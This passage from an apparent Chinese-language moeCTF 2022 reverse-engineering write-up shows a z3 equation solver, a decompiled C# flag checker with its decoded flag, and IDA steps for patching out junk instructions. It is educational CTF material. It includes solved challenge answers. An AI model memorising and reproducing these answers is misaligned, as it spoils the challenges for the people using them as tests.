class="number">13</span>] * <span class="number">3609</span> + flag[<span class="number">14</span>] * <span class="number">3878</span> + flag[<span class="number">15</span>] * <span class="number">1593</span> + flag[<span class="number">16</span>] * <span class="number">9098</span> + flag[<span class="number">17</span>]* <span class="number">6432</span> + flag[<span class="number">18</span>] * <span class="number">2584</span> + flag[<span class="number">19</span>] * <span class="number">8403</span> + flag[<span class="number">20</span>] * <span class="number">4029</span> + flag[<span class="number">21</span>] * <span class="number">30</span> ==<span class="number">13060508</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">2511</span> + flag[<span class="number">1</span>] * <span class="number">8583</span> + flag[<span class="number">2</span>] * <span class="number">2428</span> + flag[<span class="number">3</span>] * <span class="number">9439</span> +flag[<span class="number">4</span>] * <span class="number">3662</span> + flag[<span class="number">5</span>] * <span class="number">3278</span> + flag[<span class="number">6</span>] * <span class="number">8305</span> + flag[<span class="number">7</span>] * <span class="number">1100</span> + flag[<span class="number">8</span>] *<span class="number">7972</span> + flag[<span class="number">9</span>] * <span class="number">8510</span> + flag[<span class="number">10</span>] * <span class="number">8552</span> + flag[<span class="number">11</span>] * <span class="number">9993</span> + flag[<span class="number">12</span>] * <span class="number">6855</span> +flag[<span class="number">13</span>] * <span class="number">1702</span> + flag[<span class="number">14</span>] * <span class="number">1640</span> + flag[<span class="number">15</span>] * <span class="number">3787</span> + flag[<span class="number">16</span>] * <span class="number">8161</span> + flag[<span class="number">17</span>]* <span class="number">2110</span> + flag[<span class="number">18</span>] * <span class="number">5320</span> + flag[<span class="number">19</span>] * <span class="number">3313</span> + flag[<span class="number">20</span>] * <span class="number">9286</span> + flag[<span class="number">21</span>] * <span class="number">74</span> ==<span class="number">10568195</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">4974</span> + flag[<span class="number">1</span>] * <span class="number">4445</span> + flag[<span class="number">2</span>] * <span class="number">7368</span> + flag[<span class="number">3</span>] * <span class="number">9132</span> +flag[<span class="number">4</span>] * <span class="number">5894</span> + flag[<span class="number">5</span>] * <span class="number">7822</span> + flag[<span class="number">6</span>] * <span class="number">7923</span> + flag[<span class="number">7</span>] * <span class="number">6822</span> + flag[<span class="number">8</span>] *<span class="number">2698</span> + flag[<span class="number">9</span>] * <span class="number">3643</span> + flag[<span class="number">10</span>] * <span class="number">8392</span> + flag[<span class="number">11</span>] * <span class="number">4126</span> + flag[<span class="number">12</span>] * <span class="number">1941</span> +flag[<span class="number">13</span>] * <span class="number">6641</span> + flag[<span class="number">14</span>] * <span class="number">2949</span> + flag[<span class="number">15</span>] * <span class="number">7405</span> + flag[<span class="number">16</span>] * <span class="number">9980</span> + flag[<span class="number">17</span>]* <span class="number">6349</span> + flag[<span class="number">18</span>] * <span class="number">3328</span> + flag[<span class="number">19</span>] * <span class="number">8766</span> + flag[<span class="number">20</span>] * <span class="number">9508</span> + flag[<span class="number">21</span>] * <span class="number">65</span> ==<span class="number">12514783</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">4127</span> + flag[<span class="number">1</span>] * <span class="number">4703</span> + flag[<span class="number">2</span>] * <span class="number">6409</span> + flag[<span class="number">3</span>] * <span class="number">4907</span> +flag[<span class="number">4</span>] * <span class="number">5230</span> + flag[<span class="number">5</span>] * <span class="number">3371</span> + flag[<span class="number">6</span>] * <span class="number">5666</span> + flag[<span class="number">7</span>] * <span class="number">3194</span> + flag[<span class="number">8</span>] *<span class="number">5448</span> + flag[<span class="number">9</span>] * <span class="number">8415</span> + flag[<span class="number">10</span>] * <span class="number">4525</span> + flag[<span class="number">11</span>] * <span class="number">4152</span> + flag[<span class="number">12</span>] * <span class="number">1467</span> +flag[<span class="number">13</span>] * <span class="number">5254</span> + flag[<span class="number">14</span>] * <span class="number">2256</span> + flag[<span class="number">15</span>] * <span class="number">1643</span> + flag[<span class="number">16</span>] * <span class="number">9113</span> + flag[<span class="number">17</span>]* <span class="number">8805</span> + flag[<span class="number">18</span>] * <span class="number">4315</span> + flag[<span class="number">19</span>] * <span class="number">8371</span> + flag[<span class="number">20</span>] * <span class="number">1919</span> + flag[<span class="number">21</span>] * <span class="number">2</span> ==<span class="number">10299950</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">6245</span> + flag[<span class="number">1</span>] * <span class="number">8783</span> + flag[<span class="number">2</span>] * <span class="number">6059</span> + flag[<span class="number">3</span>] * <span class="number">9375</span> +flag[<span class="number">4</span>] * <span class="number">9253</span> + flag[<span class="number">5</span>] * <span class="number">1974</span> + flag[<span class="number">6</span>] * <span class="number">8867</span> + flag[<span class="number">7</span>] * <span class="number">6423</span> + flag[<span class="number">8</span>] *<span class="number">2577</span> + flag[<span class="number">9</span>] * <span class="number">6613</span> + flag[<span class="number">10</span>] * <span class="number">2040</span> + flag[<span class="number">11</span>] * <span class="number">2209</span> + flag[<span class="number">12</span>] * <span class="number">4147</span> +flag[<span class="number">13</span>] * <span class="number">7151</span> + flag[<span class="number">14</span>] * <span class="number">1011</span> + flag[<span class="number">15</span>] * <span class="number">9446</span> + flag[<span class="number">16</span>] * <span class="number">4362</span> + flag[<span class="number">17</span>]* <span class="number">3073</span> + flag[<span class="number">18</span>] * <span class="number">3006</span> + flag[<span class="number">19</span>] * <span class="number">5499</span> + flag[<span class="number">20</span>] * <span class="number">8850</span> + flag[<span class="number">21</span>] * <span class="number">23</span> ==<span class="number">11180727</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">1907</span> + flag[<span class="number">1</span>] * <span class="number">9038</span> + flag[<span class="number">2</span>] * <span class="number">3932</span> + flag[<span class="number">3</span>] * <span class="number">7054</span> +flag[<span class="number">4</span>] * <span class="number">1135</span> + flag[<span class="number">5</span>] * <span class="number">5095</span> + flag[<span class="number">6</span>] * <span class="number">6962</span> + flag[<span class="number">7</span>] * <span class="number">6481</span> + flag[<span class="number">8</span>] *<span class="number">7049</span> + flag[<span class="number">9</span>] * <span class="number">5995</span> + flag[<span class="number">10</span>] * <span class="number">6233</span> + flag[<span class="number">11</span>] * <span class="number">1321</span> + flag[<span class="number">12</span>] * <span class="number">4455</span> +flag[<span class="number">13</span>] * <span class="number">8181</span> + flag[<span class="number">14</span>] * <span class="number">5757</span> + flag[<span class="number">15</span>] * <span class="number">6953</span> + flag[<span class="number">16</span>] * <span class="number">3167</span> + flag[<span class="number">17</span>]* <span class="number">5508</span> + flag[<span class="number">18</span>] * <span class="number">4602</span> + flag[<span class="number">19</span>] * <span class="number">1420</span> + flag[<span class="number">20</span>] * <span class="number">3075</span> + flag[<span class="number">21</span>] * <span class="number">25</span> ==<span class="number">10167536</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">1489</span> + flag[<span class="number">1</span>] * <span class="number">9236</span> + flag[<span class="number">2</span>] * <span class="number">7398</span> + flag[<span class="number">3</span>] * <span class="number">4088</span> +flag[<span class="number">4</span>] * <span class="number">4131</span> + flag[<span class="number">5</span>] * <span class="number">1657</span> + flag[<span class="number">6</span>] * <span class="number">9068</span> + flag[<span class="number">7</span>] * <span class="number">6420</span> + flag[<span class="number">8</span>] *<span class="number">3970</span> + flag[<span class="number">9</span>] * <span class="number">3265</span> + flag[<span class="number">10</span>] * <span class="number">5343</span> + flag[<span class="number">11</span>] * <span class="number">5386</span> + flag[<span class="number">12</span>] * <span class="number">2583</span> +flag[<span class="number">13</span>] * <span class="number">2813</span> + flag[<span class="number">14</span>] * <span class="number">7181</span> + flag[<span class="number">15</span>] * <span class="number">9116</span> + flag[<span class="number">16</span>] * <span class="number">4836</span> + flag[<span class="number">17</span>]* <span class="number">6917</span> + flag[<span class="number">18</span>] * <span class="number">1123</span> + flag[<span class="number">19</span>] * <span class="number">7276</span> + flag[<span class="number">20</span>] * <span class="number">2257</span> + flag[<span class="number">21</span>] * <span class="number">65</span> ==<span class="number">10202212</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">2097</span> + flag[<span class="number">1</span>] * <span class="number">1253</span> + flag[<span class="number">2</span>] * <span class="number">1469</span> + flag[<span class="number">3</span>] * <span class="number">2731</span> +flag[<span class="number">4</span>] * <span class="number">9565</span> + flag[<span class="number">5</span>] * <span class="number">9185</span> + flag[<span class="number">6</span>] * <span class="number">1095</span> + flag[<span class="number">7</span>] * <span class="number">8666</span> + flag[<span class="number">8</span>] *<span class="number">2919</span> + flag[<span class="number">9</span>] * <span class="number">7962</span> + flag[<span class="number">10</span>] * <span class="number">1497</span> + flag[<span class="number">11</span>] * <span class="number">6642</span> + flag[<span class="number">12</span>] * <span class="number">4108</span> +flag[<span class="number">13</span>] * <span class="number">6892</span> + flag[<span class="number">14</span>] * <span class="number">7161</span> + flag[<span class="number">15</span>] * <span class="number">7552</span> + flag[<span class="number">16</span>] * <span class="number">5666</span> + flag[<span class="number">17</span>]* <span class="number">4060</span> + flag[<span class="number">18</span>] * <span class="number">7799</span> + flag[<span class="number">19</span>] * <span class="number">5080</span> + flag[<span class="number">20</span>] * <span class="number">8516</span> + flag[<span class="number">21</span>] * <span class="number">43</span> ==<span class="number">10435786</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">1461</span> + flag[<span class="number">1</span>] * <span class="number">1676</span> + flag[<span class="number">2</span>] * <span class="number">4755</span> + flag[<span class="number">3</span>] * <span class="number">7982</span> +flag[<span class="number">4</span>] * <span class="number">3860</span> + flag[<span class="number">5</span>] * <span class="number">1067</span> + flag[<span class="number">6</span>] * <span class="number">6715</span> + flag[<span class="number">7</span>] * <span class="number">4019</span> + flag[<span class="number">8</span>] *<span class="number">4983</span> + flag[<span class="number">9</span>] * <span class="number">2031</span> + flag[<span class="number">10</span>] * <span class="number">1173</span> + flag[<span class="number">11</span>] * <span class="number">2241</span> + flag[<span class="number">12</span>] * <span class="number">2594</span> +flag[<span class="number">13</span>] * <span class="number">8672</span> + flag[<span class="number">14</span>] * <span class="number">4810</span> + flag[<span class="number">15</span>] * <span class="number">7963</span> + flag[<span class="number">16</span>] * <span class="number">7749</span> + flag[<span class="number">17</span>]* <span class="number">5730</span> + flag[<span class="number">18</span>] * <span class="number">9855</span> + flag[<span class="number">19</span>] * <span class="number">5858</span> + flag[<span class="number">20</span>] * <span class="number">2349</span> + flag[<span class="number">21</span>] * <span class="number">71</span> ==<span class="number">9526385</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">9025</span> + flag[<span class="number">1</span>] * <span class="number">9536</span> + flag[<span class="number">2</span>] * <span class="number">1515</span> + flag[<span class="number">3</span>] * <span class="number">8177</span> +flag[<span class="number">4</span>] * <span class="number">6109</span> + flag[<span class="number">5</span>] * <span class="number">4856</span> + flag[<span class="number">6</span>] * <span class="number">6692</span> + flag[<span class="number">7</span>] * <span class="number">4929</span> + flag[<span class="number">8</span>] *<span class="number">1010</span> + flag[<span class="number">9</span>] * <span class="number">3995</span> + flag[<span class="number">10</span>] * <span class="number">3511</span> + flag[<span class="number">11</span>] * <span class="number">5910</span> + flag[<span class="number">12</span>] * <span class="number">3501</span> +flag[<span class="number">13</span>] * <span class="number">3731</span> + flag[<span class="number">14</span>] * <span class="number">6601</span> + flag[<span class="number">15</span>] * <span class="number">6200</span> + flag[<span class="number">16</span>] * <span class="number">8177</span> + flag[<span class="number">17</span>]* <span class="number">5488</span> + flag[<span class="number">18</span>] * <span class="number">5957</span> + flag[<span class="number">19</span>] * <span class="number">9661</span> + flag[<span class="number">20</span>] * <span class="number">4956</span> + flag[<span class="number">21</span>] * <span class="number">48</span> ==<span class="number">11822714</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">4462</span> + flag[<span class="number">1</span>] * <span class="number">1940</span> + flag[<span class="number">2</span>] * <span class="number">5956</span> + flag[<span class="number">3</span>] * <span class="number">4965</span> +flag[<span class="number">4</span>] * <span class="number">9268</span> + flag[<span class="number">5</span>] * <span class="number">9627</span> + flag[<span class="number">6</span>] * <span class="number">3564</span> + flag[<span class="number">7</span>] * <span class="number">5417</span> + flag[<span class="number">8</span>] *<span class="number">2039</span> + flag[<span class="number">9</span>] * <span class="number">7269</span> + flag[<span class="number">10</span>] * <span class="number">9667</span> + flag[<span class="number">11</span>] * <span class="number">4158</span> + flag[<span class="number">12</span>] * <span class="number">2856</span> +flag[<span class="number">13</span>] * <span class="number">2851</span> + flag[<span class="number">14</span>] * <span class="number">9696</span> + flag[<span class="number">15</span>] * <span class="number">5986</span> + flag[<span class="number">16</span>] * <span class="number">6237</span> + flag[<span class="number">17</span>]* <span class="number">5845</span> + flag[<span class="number">18</span>] * <span class="number">5467</span> + flag[<span class="number">19</span>] * <span class="number">5227</span> + flag[<span class="number">20</span>] * <span class="number">4771</span> + flag[<span class="number">21</span>] * <span class="number">72</span> ==<span class="number">11486796</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">4618</span> + flag[<span class="number">1</span>] * <span class="number">8621</span> + flag[<span class="number">2</span>] * <span class="number">8144</span> + flag[<span class="number">3</span>] * <span class="number">7115</span> +flag[<span class="number">4</span>] * <span class="number">1577</span> + flag[<span class="number">5</span>] * <span class="number">8602</span> + flag[<span class="number">6</span>] * <span class="number">3886</span> + flag[<span class="number">7</span>] * <span class="number">3712</span> + flag[<span class="number">8</span>] *<span class="number">1258</span> + flag[<span class="number">9</span>] * <span class="number">7063</span> + flag[<span class="number">10</span>] * <span class="number">1872</span> + flag[<span class="number">11</span>] * <span class="number">9855</span> + flag[<span class="number">12</span>] * <span class="number">4167</span> +flag[<span class="number">13</span>] * <span class="number">7615</span> + flag[<span class="number">14</span>] * <span class="number">6298</span> + flag[<span class="number">15</span>] * <span class="number">7682</span> + flag[<span class="number">16</span>] * <span class="number">8795</span> + flag[<span class="number">17</span>]* <span class="number">3856</span> + flag[<span class="number">18</span>] * <span class="number">6217</span> + flag[<span class="number">19</span>] * <span class="number">5764</span> + flag[<span class="number">20</span>] * <span class="number">5076</span> + flag[<span class="number">21</span>] * <span class="number">93</span> ==<span class="number">11540145</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">7466</span> + flag[<span class="number">1</span>] * <span class="number">8442</span> + flag[<span class="number">2</span>] * <span class="number">4822</span> + flag[<span class="number">3</span>] * <span class="number">7639</span> +flag[<span class="number">4</span>] * <span class="number">2049</span> + flag[<span class="number">5</span>] * <span class="number">7311</span> + flag[<span class="number">6</span>] * <span class="number">5816</span> + flag[<span class="number">7</span>] * <span class="number">8433</span> + flag[<span class="number">8</span>] *<span class="number">5905</span> + flag[<span class="number">9</span>] * <span class="number">4838</span> + flag[<span class="number">10</span>] * <span class="number">1251</span> + flag[<span class="number">11</span>] * <span class="number">8184</span> + flag[<span class="number">12</span>] * <span class="number">6465</span> +flag[<span class="number">13</span>] * <span class="number">4634</span> + flag[<span class="number">14</span>] * <span class="number">5513</span> + flag[<span class="number">15</span>] * <span class="number">3160</span> + flag[<span class="number">16</span>] * <span class="number">6720</span> + flag[<span class="number">17</span>]* <span class="number">9205</span> + flag[<span class="number">18</span>] * <span class="number">6671</span> + flag[<span class="number">19</span>] * <span class="number">7716</span> + flag[<span class="number">20</span>] * <span class="number">1905</span> + flag[<span class="number">21</span>] * <span class="number">29</span> ==<span class="number">12227250</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">5926</span> + flag[<span class="number">1</span>] * <span class="number">9095</span> + flag[<span class="number">2</span>] * <span class="number">2048</span> + flag[<span class="number">3</span>] * <span class="number">4639</span> +flag[<span class="number">4</span>] * <span class="number">3035</span> + flag[<span class="number">5</span>] * <span class="number">9560</span> + flag[<span class="number">6</span>] * <span class="number">1591</span> + flag[<span class="number">7</span>] * <span class="number">2392</span> + flag[<span class="number">8</span>] *<span class="number">1812</span> + flag[<span class="number">9</span>] * <span class="number">6732</span> + flag[<span class="number">10</span>] * <span class="number">9454</span> + flag[<span class="number">11</span>] * <span class="number">8175</span> + flag[<span class="number">12</span>] * <span class="number">7346</span> +flag[<span class="number">13</span>] * <span class="number">6333</span> + flag[<span class="number">14</span>] * <span class="number">9812</span> + flag[<span class="number">15</span>] * <span class="number">2034</span> + flag[<span class="number">16</span>] * <span class="number">6634</span> + flag[<span class="number">17</span>]* <span class="number">1762</span> + flag[<span class="number">18</span>] * <span class="number">7058</span> + flag[<span class="number">19</span>] * <span class="number">3524</span> + flag[<span class="number">20</span>] * <span class="number">7462</span> + flag[<span class="number">21</span>] * <span class="number">11</span> ==<span class="number">11118093</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:  <span class="comment">##检查是否有解（有解输出的是，判断结果是否==sat</span></span><br><span class="line">    m = s.model()  <span class="comment">##计算得到最后的结果</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>): <span class="comment">##得到结果的一串遍历</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[flag[i]]))),end = <span class="string">&#x27;&#x27;</span>) <span class="comment">##输出结果</span></span><br></pre></td></tr></table></figure></div><h2 id="D-flag"><a href="#D-flag" class="headerlink" title="D_flag"></a>D_flag</h2><blockquote><p>首先要搞清楚的逆向中dll和exe文件的区别是什么，dll，全称是Dynamic Link Libaray，即动态链接库，将程序运行所需要的类或方法的实现放在dll中，这样当可执行文件（即.exe文件）需要使用相关的类、方法时从dll中动态地获取，节省了可执行文件在编译、执行时花费的时间。dll比静态库更方便的是不用重新编译全部的.exe文件，需修改相应的dll的源程序就可以实现功能上的修改。<br>在C#中，如果新建的工程类型是“Windows窗体应用程序”或“控制台应用程序”那么编译生成的就是.exe文件，如果新建的工程类型是“类库”，那么编译生成的是dll文件，一般在设计中，采用两种方法相结合的方式，即在一个Solution中既有.exe项目也有.dll项目，将所有的类、接口的实现都放在类库中，.exe的源代码里只放Main函数和功能入口。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="../Post_images/moeCTF20221114.assets/1668681436904-f4630457-afe4-4076-a876-33bdec0c2a65.png"                      alt="image.png"                 ></p></blockquote><p>C#逆向可以使用dnspy进行反编译</p><blockquote><p>C#逆向常见的三种情况</p><ul><li>.net app 逆向，原理分析或修改，功能增加（目标exe，dll）</li><li>com组件dll，原理分析或修改，功能增加（目标dll）</li><li>.net visual basic 脚本分析（病毒行为检测）</li></ul></blockquote><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669035440801-8a8544bd-d311-4756-aa0b-4bda226f6ff6.png"                      alt="image.png"                ></p><div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// D_flate</span></span><br><span class="line"><span class="comment">// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> f = <span class="number">0</span>; <span class="comment">//定义一个变量f默认值为0</span></span><br><span class="line">    <span class="built_in">int</span>[] flag = <span class="keyword">new</span> <span class="built_in">int</span>[]</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">109</span>,<span class="number">111</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">123</span>,<span class="number">68</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">105</span>,</span><br><span class="line">        <span class="number">115</span>,<span class="number">95</span>,<span class="number">67</span>,<span class="number">95</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">112</span>,<span class="number">33</span>,<span class="number">125</span></span><br><span class="line">        &#125;; <span class="comment">//定义一个叫flag的数组，存放数字</span></span><br><span class="line">    Console.WriteLine(<span class="string">&quot;In music theory, there is a note that has the same pitch as D flat.&quot;</span>);</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;Do you know it?\nNow plz input your flag:&quot;</span>);</span><br><span class="line">    <span class="comment">//输出两行提示文字</span></span><br><span class="line">    <span class="built_in">string</span> input = Console.ReadLine();</span><br><span class="line">    <span class="comment">//输入字符 input</span></span><br><span class="line">    <span class="built_in">byte</span>[] byteArray = Encoding.ASCII.GetBytes(input);</span><br><span class="line">    <span class="comment">//输入的数组 进行ascii编码</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; input.Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (flag[i] == (<span class="built_in">int</span>)byteArray[i])</span><br><span class="line">        <span class="comment">//将输入的byteArray字符强制转化，为int类型，如果等于的flag的数字的话，</span></span><br><span class="line">            <span class="comment">//f++继续比较，否则退出</span></span><br><span class="line">        &#123;</span><br><span class="line">            f++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (f == flag.Length)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;TTTTTQQQQQQLLLLLLL!!! This is your flag!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;QwQ, plz try again.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*Console.ReadKey(); 是针对 VS.NET 用户的。</span></span><br><span class="line"><span class="comment">这使得程序会等待一个按键的动作，防止程序从 Visual Studio</span></span><br><span class="line"><span class="comment">.NET 启动时屏幕会快速运行并关闭。*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">109</span>,<span class="number">111</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">123</span>,<span class="number">68</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">105</span>,</span><br><span class="line">       <span class="number">115</span>,<span class="number">95</span>,<span class="number">67</span>,<span class="number">95</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">112</span>,<span class="number">33</span>,<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(key[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">##moectf&#123;D_flate_is_C_sharp!&#125;</span></span><br></pre></td></tr></table></figure></div><p>(小声逼逼：官方的exp参考没自己写的香~</p><h2 id="chicken-soup"><a href="#chicken-soup" class="headerlink" title="chicken_soup"></a>chicken_soup</h2><p>查壳是32位的程序，拖进IDA分析，F5发现伪代码</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+10h] [ebp-68h] BYREF</span></span><br><span class="line"><span class="comment">//定义变量数组v4，长度为100</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I poisoned the program... Can you reverse it?!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Come on! Give me your flag:&quot;</span>);</span><br><span class="line">    <span class="comment">//输出提示</span></span><br><span class="line">    sub_4012A0(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)v4); <span class="comment">//这里的v4非常蹊跷，发现里面啥也没有 如下图示</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v4) == <span class="number">38</span> ) <span class="comment">//要求的v4长度得是38</span></span><br><span class="line">    &#123;</span><br><span class="line">        ((<span class="type">void</span> (__cdecl *)(<span class="type">char</span> *))loc_401000)(v4);</span><br><span class="line">        ((<span class="type">void</span> (__cdecl *)(<span class="type">char</span> *))loc_401080)(v4); <span class="comment">//这两个函数也比较奇怪，里面感觉没东西</span></span><br><span class="line">        <span class="keyword">if</span> ( sub_401110(v4, &amp;unk_403000) ) <span class="comment">//这里表示成功 猜测程序中是有指令模糊的</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\nTTTTTTTTTTQQQQQQQQQQQQQLLLLLLLLL!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\nQwQ, please try again.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nQwQ, please try again.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669118508125-c7c8d314-7b57-4286-b6fa-a0da1ffb2cf9.png"                      alt="v4 展开图" title="v4 展开图"                ><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669118631359-b4d90fac-565f-4bd3-8f20-a4c5518f1f71.png"                      alt="loc_401000展开图" title="loc_401000展开图"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669118668790-2ecf1577-9261-48da-acde-b34b4306c356.png"                      alt="loc_401080展开图" title="loc_401080展开图"                ><br>根据题目的提示也是花指令的原因<br>根据伪代码：先是将v4的值传入字符，再用loc_401000和loc_401080进行字符的加密，最后和unk_403000进行对比<br>双击之后，展开发现都是飘红的，一串杂乱的数据无法识别–&gt;因为ida的分析被花指令扰乱了。在飘红的loc_40100D地方按U键，将代码转为未定义的数据，在unk_40100E处按C转为代码。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669119114256-0663d0a6-0aeb-4c88-92e8-bc0ab29f1d65.png"                      alt="按U转字符前" title="按U转字符前"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/./../Post_images/moeCTF20221114.assets/1669119169706-23e0fe3c-eae5-48f9-b6a7-1228bfcabb91.png"                      alt="按U转字符后" title="按U转字符后"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669119224195-23512be1-74ec-4f54-b7a9-a596a2c9ddcd.png"                      alt="unk_40100E处按C转代码后" title="unk_40100E处按C转代码后"                ><br>然后在unk_40100E处按C转代码，40100D处是无用指令，扰乱了ida的分析，patch掉没有用的指令<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1669119472240-04703614-2b25-4f9a-af35-188d7f59ae2f.png"                      alt="image.png"                ></p><blockquote><p>patch的方法：</p><ol><li>找到飘红处：U–&gt;代码转为未定义数据</li><li>unk_……函数 C转为代码</li><li>选中 jz jnz db三行指令–&gt;nop  快捷键：ctrl+alt+k</li><li>db指令 C–&gt;转为代码</li><li>push处 P–&gt;创建函数</li><li>F5查看伪代码</li></ol></blockquote><p>选中这3句话,按下ctrl+alt+k,输入nop点patch,40100D处的0x90也按C转为代码,然后在 loc_401000处按P创建函数,F5就可以得到伪代码。可以看出loc_401000是一个加的操作<code>a1[i] += a1[i + 1]</code><br><img                       lazyload                 